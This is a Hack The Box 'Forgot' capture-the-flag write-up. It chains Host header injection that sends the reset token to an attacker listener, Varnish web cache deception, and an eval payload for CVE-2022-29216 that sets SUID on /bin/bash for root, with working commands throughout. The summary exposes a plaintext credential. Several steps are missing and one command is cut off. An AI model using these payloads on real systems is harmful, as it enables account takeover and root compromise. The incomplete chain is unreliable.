<h2 id="overview">Overview</h2>
<p>Forgot is a Medium-difficulty Linux machine that chains together four distinct attack techniques:</p>
<ol>
<li><strong>Username enumeration</strong> via HTML source code</li>
<li><strong>Host Header Injection</strong> to hijack a password reset link</li>
<li><strong>Web Cache Deception</strong> abusing a Varnish reverse proxy to steal an admin session</li>
<li><strong>CVE-2022-29216</strong> : a TensorFlow <code>eval()</code> injection for privilege escalation to root</li>
</ol>
<p>Each step builds on the last. There is no single magic exploit - it requires reading the application carefully, understanding how caches work, and knowing how a trusted Python script can be weaponized.</p>
<hr>
<h2 id="phase-1-reconnaissance">Phase 1: Reconnaissance</h2>
<h3 id="step-1-port-scanning-with-nmap">Step 1: Port Scanning with nmap</h3>
<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.228.104
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>22/tcp open  ssh
80/tcp open  http
</code></pre>
<p><strong>Reason:</strong><br>Start by identifying exposed services. <code>nmap</code> sends TCP SYN packets to every port (1-65535) and reports which ones respond. <code>-p-</code> means all ports, <code>--min-rate 10000</code> sends packets fast to avoid waiting forever.</p>
<p><br>Two ports means a small attack surface. SSH (22) is almost never exploitable directly without credentials. HTTP (80) is always interesting - it's a web application, and web apps have logic bugs, misconfigurations, and user-supplied input. That's where we focus first.</p>
<p><strong>What we learned:</strong>  </p>
<ul>
<li>Port 22: SSH (we'll use this later once we have credentials)</li>
<li>Port 80: HTTP web application (our primary target)</li>
</ul>
<hr>
<h3 id="step-2-fingerprinting-the-web-stack">Step 2: Fingerprinting the Web Stack</h3>
<pre><code class="language-bash" data-language="bash">curl -s http://10.129.228.104 | grep -i 'robert\|dev\|fix'
</code></pre>
<p><strong>But first - why look at the source code?</strong></p>
<p>When you visit a website in a browser, you only see what the developer intended. But the raw HTML source often contains comments, debug notes, developer annotations, and accidentally leaked information that was never meant to be seen by users.</p>
<p>Developers often leave comments like:</p>
<pre><code class="language-html" data-language="html">&lt;!-- TODO: fix this before release --&gt;
&lt;!-- Q1 release fix by robert-dev-367120 --&gt;
</code></pre>
<p>These are invisible in the browser but visible if you <code>curl</code> or "View Source".</p>
<p><strong>Why we grep for <code>robert</code>:</strong><br>We're looking for anything that looks like a username. The writeup hinted at a <code>robert-dev-XXXXX</code> pattern. The number at the end is based on your HTB tunnel IP - HTB does this so players on shared labs don't interfere with each other.</p>
<p><strong>Output:</strong></p>
<pre><code class="language-html" data-language="html">&lt;!-- Q1 release fix by robert-dev-367120 --&gt;
</code></pre>
<p><strong>What we learned:</strong><br>A valid username: <code>robert-dev-367120</code>. This is valuable - the "Forgot Password" feature requires a valid username.</p>
<p><br>Do not trust that a web page only contains what you see. read the source. Developers are human - they leave breadcrumbs.</p>
<hr>
<h2 id="phase-2-host-header-injection">Phase 2: Host Header Injection</h2>
<h3 id="background-how-password-reset-works-and-how-it-goes-wrong">Background: How Password Reset Works (and How It Goes Wrong)</h3>
<p>When you click "Forgot Password" on a website, the typical flow is:</p>
<ol>
<li>You enter your username</li>
<li>The server generates a secret token and stores it in the database</li>
<li>The server constructs a link: <code>http://example.com/reset?token=SECRETTOKEN</code></li>
<li>The server emails that link to the user</li>
</ol>
<p>The vulnerability here: <strong>how does the server know what domain to put in the link?</strong></p>
<p>A lazy/insecure way is to take the <code>Host</code> HTTP header from the incoming request. That header is normally set by your browser to the domain you're visiting. But there's <strong>nothing stopping you from changing it</strong>.</p>
<p>If the server uses <code>Host</code> to build the reset URL and you set <code>Host: 10.10.16.84</code>, the server will generate:</p>
<pre><code>http://10.10.16.84/reset?token=REDACTED
</code></pre>
<p>...and send that link to the user. When the user (or the bot) clicks it, the request - including the secret token - goes to <strong>your</strong> machine instead of the legitimate server.</p>
<p>This is called <strong>Host Header Injection</strong>.</p>
<hr>
<h3 id="step-3-start-a-listener">Step 3: Start a Listener</h3>
<p>On your Kali machine (needs port 80 open):</p>
<pre><code class="language-bash" data-language="bash">sudo python3 -m http.server 80
</code></pre>
<p><strong>Why port 80:</strong><br>The reset link will be <code>http://</code> (not HTTPS), so it will connect to port 80. We run Python's built-in HTTP server to receive and log any incoming HTTP requests.</p>
<p><strong>Why sudo:</strong><br>Ports below 1024 require root privileges on Linux.</p>
<p><br>We're setting up a "catch" before we cast the line. We need our listener running before we trigger the password reset, otherwise the request arrives and nobody is home to record it.</p>
<hr>
<h3 id="step-4-trigger-the-password-reset-with-a-poisoned-host-header">Step 4: Trigger the Password Reset with a Poisoned Host Header</h3>
<pre><code class="language-bash" data-language="bash">curl -s "http://10.129.228.104/forgot?username=robert-dev-367120" -H "Host: 10.10.16.84"
</code></pre>
<p><strong>Breaking this down:</strong></p>
<ul>
<li><code>curl -s</code> : silent mode, suppresses progress meter</li>
<li><code>"http://10.129.228.104/forgot?username=robert-dev-367120"</code> : the forgot password endpoint with our discovered username</li>
<li><code>-H "Host: 10.10.16.84"</code> : override the Host header with our attacker IP</li>
</ul>
<p><strong>What happens on the server (from the source code):</strong></p>
<pre><code class="language-python" data-language="python">link = 'http://' + request.headers.get('host') + '/reset?token=' + token
</code></pre>
<p>The server literally concatenates our <code>Host</code> header into the reset link. It stores that link in the database. The bot clicks it. Our server receives the request.</p>
<p><strong>Wait ~60 seconds</strong> and watch the Python HTTP server terminal:</p>
<pre><code>10.129.228.104 - - [09/Jun/2026 10:56:01] "GET /reset?token=REDACTED HTTP/1.1" 404 -
</code></pre>
<p>The token is in the URL. The 404 is fine - our Python server doesn't have that route, but we don't need it to. We just needed to log the token.</p>
<p><br>The server trusts user-supplied input (the Host header) to build sensitive links. Do not trust input. validate. As attackers, we exploit the trust.</p>
<hr>
<h3 id="step-5-use-the-token-to-reset-the-password">Step 5: Use the Token to Reset the Password</h3>
<pre><code class="language-bash" data-language="bash">curl -s -X POST "http://10.129.228.104/reset?token=${RESET_TOKEN_URLENCODED}" \
  --data "password=${NEW_PASSWORD}&amp;confirm=${NEW_PASSWORD}"
</code></pre>
<p><strong>Output:</strong> <code>success</code></p>
<p>We now own robert's account with the password <code>REDACTED</code>.</p>

<h3 id="step-6-log-in-and-save-the-session-cookie">Step 6: Log In and Save the Session Cookie</h3>
<pre><code class="language-bash" data-language="bash">curl -s -c cookies.txt -X POST "http://10.129.228.104/login" \
  --data "username=robert-dev-367120&amp;password=REDACTED" -L
</code></pre>
<ul>
<li><code>-c cookies.txt</code> : save cookies to a file for reuse in later requests</li>
<li><code>-L</code> : follow redirects (the login likely redirects to <code>/home</code>)</li>
</ul>
<p>After login, <code>cookies.txt</code> contains:</p>
<pre><code>session    52b92f5e-f4ef-49c1-9d98-83bdd0e38f4a
</code></pre>
<p>This session cookie authenticates us as robert for all future requests. We pass it with <code>-b cookies.txt</code>.</p>

<h2 id="phase-3-web-cache-deception">Phase 3: Web Cache Deception</h2>
<h3 id="background-what-is-varnish-and-why-does-it-matter">Background: What is Varnish and Why Does It Matter?</h3>
<p><strong>Varnish</strong> is a reverse proxy / HTTP cache that sits in front of the real web server. Its job is to cache responses and serve them quickly without hitting the backend every time.</p>
<pre><code>Client → Varnish (port 80) → Flask app (port 8080)
</code></pre>
<p>When Varnish has a cached response for a URL, it serves that cached version to <strong>any</strong> client requesting that URL - regardless of who they are or whether they're logged in.</p>
<p><strong>The Varnish config on this machine:</strong></p>
<pre><code class="language-vcl" data-language="vcl">sub vcl_recv {
    if (req.url ~ "/static") {
        return (hash);   # cache this request
    }
}
</code></pre>
<p>This means: <strong>any URL containing the string <code>/static</code> gets cached.</strong> Not just <code>/static/</code>, but <code>/static</code> anywhere in the path. So:</p>
<ul>
<li><code>/static/image.png</code> → cached</li>
<li><code>/admin_tickets/static/anything</code> → also cached</li>
<li><code>/tickets/static/0xdf</code> → also cached</li>
</ul>
<p><strong>The Flask app has wildcard routes:</strong></p>
<pre><code class="language-python" data-language="python">@app.route('/admin_tickets', defaults={'path':''})
@app.route('/admin_tickets/&lt;path:path&gt;')
def admin(path):
    # same page regardless of what comes after /admin_tickets/
</code></pre>
<p>So <code>/admin_tickets/static/test.png</code> loads the same admin page as <code>/admin_tickets</code>. The <code>static/test.png</code> part is ignored by Flask but <strong>seen by Varnish</strong> as a reason to cache.</p>
<hr>
<h3 id="the-attack-web-cache-deception">The Attack: Web Cache Deception</h3>
<p><strong>The goal:</strong> Get the admin to visit <code>/admin_tickets/static/&lt;unique-path&gt;</code> with their session. Varnish caches that response. We then fetch the same URL unauthenticated and get the cached admin page.</p>
<p><strong>Mechanism:</strong></p>
<ol>
<li>Admin visits <code>/admin_tickets/static/xyz456</code> → Varnish checks its cache (miss), forwards to Flask</li>
<li>Flask sees an admin session → returns the full admin page</li>
<li>Varnish sees <code>/static</code> in the URL → caches the response</li>
<li>We request <code>/admin_tickets/xyz456</code> with no auth → Varnish serves the <strong>cached admin page</strong> to us</li>
</ol>
<p><strong>Critical mistake to avoid:</strong><br>If WE visit the URL before the admin does, our unauthenticated request hits Flask first, gets a redirect to <code>/</code>, and Varnish caches the <strong>redirect</strong> instead of the admin page. Then when admin clicks, Varnish serves them (and us) the cached redirect. The cache is poisoned with useless data.</p>
<p><strong>Use a fresh URL that you have never visited.</strong></p>

<pre><code class="language-bash" data-language="bash">curl -s -b cookies.txt -X POST "http://10.129.228.104/escalate" \
  --data-urlencode "issue=Pending PR Merge" \

<p><strong>Why <code>--data-urlencode</code>:</strong><br>Spaces and special characters in POST data need URL encoding. <code>--data-urlencode</code> handles this automatically.</p>

<p><strong>Wait 3 full minutes. Do not visit the URL yourself.</strong></p>

<h2 id="phase-5-privilege-escalation">Phase 5: Privilege Escalation</h2>
<h3 id="step-11-check-sudo-privileges">Step 11: Check Sudo Privileges</h3>
<pre><code class="language-bash" data-language="bash">sudo -l
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>User diego may run the following commands on forgot:
    (ALL) NOPASSWD: /opt/security/ml_security.py
</code></pre>
<p><strong>What this means:</strong><br>Diego can run <code>/opt/security/ml_security.py</code> as <strong>root</strong> without a password. This is the most important line on the box.</p>
<p><br><code>sudo -l</code> is the first command you run after getting a shell. Always. It reveals what the current user can do as a higher-privileged user. A script running as root is only as secure as its code. If the code has a vulnerability, we have root.</p>
<hr>
<h3 id="step-12-understand-ml-security-py">Step 12: Understand ml_security.py</h3>
<p>Reading the script, here's what it does:</p>
<ol>
<li><strong>Loads ML models</strong> from <code>/opt/security/lib/</code> (scikit-learn classifiers + Doc2Vec)</li>
<li><strong>Reads data from MySQL:</strong><pre><code class="language-python" data-language="python">cursor.execute('select reason from escalate')
</code></pre>
It fetches every <code>reason</code> from the <code>escalate</code> table</li>
<li><strong>Scores each entry</strong> using 6 ML models to determine if it looks like XSS</li>
<li><strong>If score ≥ 0.5</strong>, it calls:<pre><code class="language-python" data-language="python">preprocess_input_exprs_arg_string(data[i], safe=False)
</code></pre>
</li>
</ol>
<p><strong>The vulnerable function:</strong><br><code>preprocess_input_exprs_arg_string</code> is imported from TensorFlow:</p>
<pre><code class="language-python" data-language="python">from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string
</code></pre>
<p>This is <strong>CVE-2022-29216</strong>. When called with <code>safe=False</code>, it passes user input to Python's <code>eval()</code>:</p>
<pre><code class="language-python" data-language="python">input_dict[input_key] = eval(expr)  # the vulnerability
</code></pre>
<p><code>eval()</code> executes arbitrary Python code. Since the script runs as root via sudo, any code we inject runs as root.</p>
<hr>
<h3 id="step-13-craft-the-payload">Step 13: Craft the Payload</h3>
<p>We need a string that:</p>
<ol>
<li><strong>Scores ≥ 0.5 for XSS</strong> : so the ML model triggers <code>preprocess_input_exprs_arg_string</code></li>
<li><strong>Contains valid Python for <code>eval()</code></strong> : so it executes our command</li>
</ol>
<p>The format expected by <code>preprocess_input_exprs_arg_string</code>:</p>
<pre><code>varname=expression
</code></pre>
<p>Our payload:</p>
<pre><code>hello=exec("""\nimport os\nos.system("chmod +s /bin/bash")\nprint("%3Cscript%3Ealert()%3C%2Fscript%3E")""")
</code></pre>
<p><strong>Breaking it down:</strong></p>
<ul>
<li><code>hello=</code> : the variable name (required syntax)</li>
<li><code>exec("""...""")</code> : Python's <code>exec()</code> runs multi-line code (whereas <code>eval()</code> only handles expressions)</li>
<li><code>\nimport os\nos.system("chmod +s /bin/bash")</code> : imports <code>os</code> module and sets SUID bit on <code>/bin/bash</code></li>
<li><code>\nprint("%3Cscript%3E...")</code> : URL-encoded <code>&lt;script&gt;alert()&lt;/script&gt;</code>, included to make the payload look like XSS so the ML model scores it high enough</li>
</ul>
<p><strong>Why SUID on bash instead of a reverse shell?</strong><br>Setting SUID on <code>/bin/bash</code> is simpler, persistent, and doesn't require an open port. Once set, we run <code>/bin/bash -p</code> to get a root shell. The <code>-p</code> flag tells bash to preserve the elevated privileges (not drop SUID).</p>
<hr>
<h3 id="step-14-insert-the-payload-into-mysql">Step 14: Insert the Payload into MySQL</h3>
<pre><code class="language-bash" data-language="bash">mysql -u diego -pREDACTED app -e 'insert into escalate values ("pwn","pwn","pwn","hello=exec(\"\"\"\\nimport os\\nos.system(\"chmod +s /bin/bash\")\\nprint(\\\"%3Cscript%3Ealert()%3C%2Fscript%3E\\\")\"\"\")")';
</code></pre>
<p><strong>Why MySQL directly?</strong><br>The web form for escalation has some filtering (links to external IPs get flagged). By going directly to the database with diego's credentials (found in <code>ml_security.py</code> itself), we bypass any web-layer filtering completely.</p>
<p><strong>How we got the DB credentials:</strong><br>They're hardcoded in <code>ml_security.py</code>:</p>
<pre><code class="language-python" data-language="python">conn = mysql.connector.connect(host='localhost', database='app', user='diego', password='REDACTED')
</code></pre>
<p>The same password diego uses for SSH is also the DB password.</p>
<hr>
<h3 id="step-15-trigger-the-script-as-root">Step 15: Trigger the Script as Root</h3>
<pre><code class="language-bash" data-language="bash">sudo /opt/security/ml_security.py
</code></pre>
<p>The script runs, fetches our payload from the database, the ML models score it high (XSS content), and <code>preprocess_input_exprs_arg_string</code> calls <code>eval()</code> on it as root. Our <code>os.system("chmod +s /bin/bash")</code> executes.</p>
<hr>
<h3 id="step-16-verify-suid-and-get-root-shell">Step 16: Verify SUID and Get Root Shell</h3>
<pre><code class="language-bash" data-language="bash">ls -la /bin/bash
</code></pre>
<pre><code>-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
</code></pre>
<p>The <code>s</code> in the permissions means SUID is set. Now:</p>
<pre><code class="language-bash" data-language="bash">/bin/bash -p
</code></pre>
<pre><code>bash-5.0# cat /root/root.txt
1b7818[redacted]911289e
</code></pre>
<p>Root flag captured.</p>
<hr>
<h2 id="full-attack-chain-summary">Full Attack Chain Summary</h2>
<pre><code>[Recon]
nmap → ports 22, 80
curl source → username: robert-dev-367120
          ↓
[Host Header Injection]
Poison Host header → intercept reset token → reset robert's password → login
          ↓
[Web Cache Deception]
Submit link /admin_tickets/static/&lt;unique&gt; → wait for admin bot → retrieve cached admin page
→ leaked: diego:dCb#1!x0%gjq
          ↓
[Initial Access]
SSH as diego → user.txt
          ↓
[Privilege Escalation]
sudo ml_security.py → CVE-2022-29216 eval() injection via MySQL
→ chmod +s /bin/bash → /bin/bash -p → root.txt
</code></pre>
<hr>
<h2 id="key-lessons">Key Lessons</h2>
<h3 id="1-do-not-trust-user-supplied-headers">1. Do not trust user-supplied headers</h3>
<p>The <code>Host</code> header should never be used to construct sensitive URLs like password reset links. Use the configured domain from the server's own config.</p>
<h3 id="2-web-caches-are-shared-they-don-t-understand-authentication">2. Web caches are shared: they don't understand authentication</h3>
<p>Varnish cached responses based purely on URL pattern. It had no concept of "this response was for an authenticated admin and shouldn't be served to random users." Cache rules must explicitly strip cookies or never cache authenticated responses.</p>
<h3 id="3-wildcard-routes-cache-rules-dangerous-combination">3. Wildcard routes + cache rules = dangerous combination</h3>
<p>Flask's <code>/admin_tickets/&lt;path:path&gt;</code> wildcard meant any path loaded the admin page. Varnish's <code>/static</code> rule cached anything with that string. The two features interacted to create a vulnerability that neither alone would have caused.</p>
<h3 id="4-hardcoded-credentials-spread-risk">4. Hardcoded credentials spread risk</h3>
<p>The same password appeared in the SSH login, the DB connection string in <code>ml_security.py</code>, and inside the leaked admin ticket. One credential leak compromised everything.</p>
<h3 id="5-scripts-that-run-as-root-must-be-treated-as-root-itself">5. Scripts that run as root must be treated as root itself</h3>
<p>Any script with <code>sudo NOPASSWD</code> is as dangerous as a root shell if it processes attacker-controlled input. <code>eval()</code> with user data is almost always exploitable. <code>safe=False</code> is never safe.</p>
<h3 id="6-don-t-poison-your-own-cache">6. Don't poison your own cache</h3>
<p>When performing cache deception, never visit the target URL before the victim does.
